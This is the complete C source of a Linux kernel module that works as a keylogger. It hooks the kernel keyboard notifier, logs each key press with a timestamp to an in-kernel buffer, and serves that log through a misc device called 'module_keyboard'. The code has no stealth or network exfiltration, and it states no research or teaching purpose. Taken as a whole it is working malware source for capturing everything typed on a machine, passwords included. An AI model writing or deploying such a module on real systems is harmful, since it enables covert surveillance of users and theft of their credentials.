#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/ktime.h>

#define BUF_SIZE 4096

static char log_buffer[BUF_SIZE];
static size_t log_index = 0;
static DEFINE_MUTEX(log_lock);

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static struct notifier_block nb = {
    .notifier_call = key_event_notifier,
};

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keyboard_read,
};

static struct miscdevice keyboard_misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "module_keyboard",
    .fops = &fops,
};

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)

{
    struct keyboard_notifier_param *param = data;
    char entry[128];
    int len;

    if (action == KBD_KEYCODE && param->down)
    {
        len = snprintf(entry, sizeof(entry), "%lu: Key %u (%s) pressed\n",
                       ktime_get_seconds(), param->value, param->down ? "Pressed" : "Released");

        mutex_lock(&log_lock);
        if (log_index + len < BUF_SIZE)
        {
            memcpy(log_buffer + log_index, entry, len);
            log_index += len;
        }
        mutex_unlock(&log_lock);
    }
    return NOTIFY_OK;
}

static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret;

    mutex_lock(&log_lock);
    if (*ppos >= log_index)
    {
        ret = 0;
    }
    else
    {
        ret = min(count, log_index - *ppos);
        if (copy_to_user(buf, log_buffer + *ppos, ret))
            ret = -EFAULT;
        else
            *ppos += ret;
    }
    mutex_unlock(&log_lock);

    return ret;
}

static int __init keyboard_init(void)
{
    int ret;

    ret = misc_register(&keyboard_misc_device);
    if (ret)
        return ret;

    ret = register_keyboard_notifier(&nb);
    if (ret)
        misc_deregister(&keyboard_misc_device);

    return ret;
}

static void __exit keyboard_exit(void)
{
    unregister_keyboard_notifier(&nb);
    misc_deregister(&keyboard_misc_device);
}

module_init(keyboard_init);
module_exit(keyboard_exit);

MODULE_LICENSE("GPL");
